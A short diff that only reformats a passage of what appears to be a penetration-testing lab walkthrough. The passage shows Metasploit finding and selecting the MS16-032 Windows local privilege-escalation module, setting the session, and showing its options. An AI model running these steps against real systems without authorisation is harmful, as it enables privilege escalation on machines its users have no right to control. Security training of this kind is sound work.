@@ -302,13 +302,13 @@ Matching Modules
    #  Name                                                           Disclosure Date  Rank    Check  Description
    -  ----                                                           ---------------  ----    -----  -----------
    0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation
-
+```
 Found one!
 
-> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+`> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
 
 We'll make sure that 'session' is set to '2'. That way it's using the session we want. Note that if your session expires, that's OK. Just set it back up, and check your sessions with 'sessions -l'. Then you can set your session to the appropriate session number.
-
+```
 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
 
 Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
